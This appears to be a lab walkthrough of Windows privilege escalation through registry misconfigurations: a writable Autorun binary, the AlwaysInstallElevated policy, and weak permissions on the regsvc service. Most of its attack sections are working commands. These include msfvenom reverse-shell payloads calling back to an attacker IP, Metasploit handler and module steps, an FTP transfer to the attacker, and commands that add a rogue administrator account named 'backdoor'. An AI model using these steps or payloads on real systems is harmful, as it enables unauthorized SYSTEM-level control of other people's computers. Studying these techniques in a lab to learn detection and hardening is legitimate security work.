# Registry

The Windows Registry is a central hierarchical database in Microsoft Windows that stores configuration settings and options for:

- The operating system (Windows itself)
- Installed software and applications
- User profiles and preferences
- Hardware devices and drivers

In simple words it is brain or blueprint for windows, where almost everything about how the system runs is recorded

## Autorun 

Autorun refers to specific registry keys that tell the operating system to automatically start a program, service, or script when the system boots or when a user logs in. We are going to see any thing run automatically have any permission that is useful for our exploitation 

**Victim**

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‘Logon’ tab
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file

here the autorun, accesschk are cis internal tools 

Now we found the file, so we moving for exploitation phase 

**Attacker**

```
// generate a payload for windows reverse shell 
msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip -f exe -o program.exe

msfconsole 
use multi/handler 
set payload windows/meterpreter/reverse_tcp 
set lhost attacker_ip 
option 
run 
```

Now host the payload program.exe using python server in the attacker side and download it in the victim side and replace with the program.exe in the AutoRun folder 

Now log out and sign in again in as high privileged user and now check the meterpreter we gained the reverse shell 

```
// we have gained reverse shell as administrator
getuid 
administrator
```

## Always Install Elevated 

The AlwaysInstallElevated setting is a Windows policy that affects how MSI (Microsoft Installer) packages are installed. When this policy is enabled, Windows Installer packages (.msi files) will always be installed with elevated (Administrator) privileges, even if the user who launches them does not have administrative rights. (AlwaysInstallElevated = 1 for this attack) 

now login as low privileged user in the victim machine 

**Victim**

```
// open cmd and type 
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

// here we can see for both AlwaysInstallElevated is set to 1 so attack is possible 

// To understand the severity we can make a user add which run as high privilege and we can set the new user as administrator
Write-UserAddMSI 

// UserAdd.msi is generated running it we can set a new administrator called backdoor 
net localgroup administrator
backdoor
Administrator 
```

**Attacker** 

Generating the payload 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip -f msi -o setup.msi
```

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost attacker_ip
run 
```

Now transfer the payload setup.msi to the victim windows machine using python server and run the setup.msi in the victim machine. now we gained the reverse shell 

```
// we gain the reverse shell as system 
getuid 
server username: NT AUTHORITY\SYSTEM 

// if we gained reverse shell as low level user then background the session of low level user 
background 
use exploit/windows/local/always_install_elevated 
set session 1 
run
```

## regsvc 

It is a Windows service that allows remote users (with proper permissions) to connect to the Windows Registry and read/write keys over the network 

**Victim** 

```
// open the powershell with bypassing the execution restrictions 
powershell -ep bypass 

// now see there is full control for regsvc for authority\system 
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

// so we found it contains full control so we going add a malicious service which add a administrator account for the attacker 
```

**Attacker** 

we going to get the file in windows and modify it and again run it. Here to get the file from the windows we are going to run a ftp using python 

```
python -m pyftplib -p 21 --write 

// now open cmd from the folder of windows_service.c in the victim machine and connect to the ftp with anonymous
ftp attacker_ip 
put windows_service.c 
```

Now the file is transferred to the attacker machine 

- Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
- Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
- Copy the generated file x.exe, to the Windows VM using python server 

**Again in Victim**

- Place x.exe in ‘C:\Temp’.
- Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
- In the command prompt type: sc start regsvc
- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
